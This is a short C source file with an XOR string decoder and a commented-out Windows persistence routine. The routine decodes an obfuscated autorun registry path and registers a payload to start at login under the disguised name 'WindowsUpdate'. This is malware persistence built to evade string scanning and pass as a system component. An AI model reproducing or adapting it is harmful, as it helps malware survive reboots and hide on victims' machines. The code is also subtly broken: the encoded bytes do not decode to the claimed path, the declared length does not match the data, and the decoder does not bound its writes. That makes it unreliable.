// also not my code
#include <stdlib.h>
#include <string.h>

char *decode_obfuscated(char **chunks, int chunk_count, int total_len, char key) {
    char *output = malloc(total_len + 1); // allocate memory for decoded string + null
    if (!output) return NULL;

    int index = 0;
    for (int i = 0; i < chunk_count; i++) {
        for (int j = 0; chunks[i][j] != '\0'; j++) {
            output[index++] = chunks[i][j] ^ key; // XOR decode byte by byte
        }
    }
    output[total_len] = '\0'; // null terminate for C string

    return output; // decoded, ready to use string
}

/*
// persist.c
#include <windows.h>
#include "deobf.h"

void persist(const char *payload_path) {
    HKEY hKey;
    const char *valueName = "WindowsUpdate";

    // Obfuscated "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    char *reg_path_obf[] = {
        "\x18\x24\x25\x2D\x2E\x21\x26\x63",
        "\x06\x24\x20\x22\x20\x26\x21\x27",
        "\x20\x24\x26\x2D\x2F\x26\x63\x1C",
        "\x20\x2F\x22\x20\x22\x3E\x20\x2E",
        "\x20\x2C\x2F\x2A\x26\x3F\x63\x21",
        "\x20\x20"
    };
    int reg_path_len = 46;
    char xor_key = 0x4B;
    int chunk_count = sizeof(reg_path_obf) / sizeof(reg_path_obf[0]);

    // Decode at runtime
    char *reg_path = decode_obfuscated(reg_path_obf, chunk_count, reg_path_len, xor_key);
    if (!reg_path) return;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, reg_path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE *)payload_path, (DWORD)(lstrlenA(payload_path) + 1));
        RegCloseKey(hKey);
    }

    free(reg_path);
}

*/